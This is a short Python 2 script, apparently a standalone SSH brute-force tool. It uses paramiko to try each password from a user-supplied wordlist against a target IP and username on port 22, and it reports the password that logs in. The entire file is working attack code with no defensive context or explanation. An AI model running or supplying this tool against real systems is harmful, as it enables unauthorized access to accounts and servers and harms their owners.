import paramiko, sys, socket, os

global host, user, line, file

line ="\n-----------------------------------------------------------\n"

def connect(password, code=0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=user, password=password)

	except paramiko.AuthenticationException:
		#[!] Auth Failed
		code = 1
	except socket.error, e:
		#[!] Connection Failed!...host down!
		code = 2

	ssh.close()
	return code


try: 
	host = raw_input(">> Enter target ip: ")
	user = raw_input(">> Enter target uesrname: ")
	file = raw_input(">> Enter wordlist path: ")

	if os.path.exists(file) == False:
		print "\n [!] Error!! File Path Not Found!"
		sys.exit(4)
except KeyboardInterrupt:
	print "\n\n[!] User presses ctrl + c!!"
	sys.exit(3)

file = open(file)

print ''

for i in file.readlines():
	password = i.strip("\n")
	try:
		response = connect(password)

		if response == 0:
			print("%s [*] User: %s [*] Password Found: %s%s" %(line, user, password, line))
			sys.exit(0)
		elif response == 1:
			print("[!] User: %s [!] Password: %s ==> Login Incorrect!! " %(user, password))

		elif response == 2:
			print("[* Error! Connection Lost! or host might be down!%s"% (host))
			sys.exit(2)

	except Exception, e:
		print e
		pass

file.close()
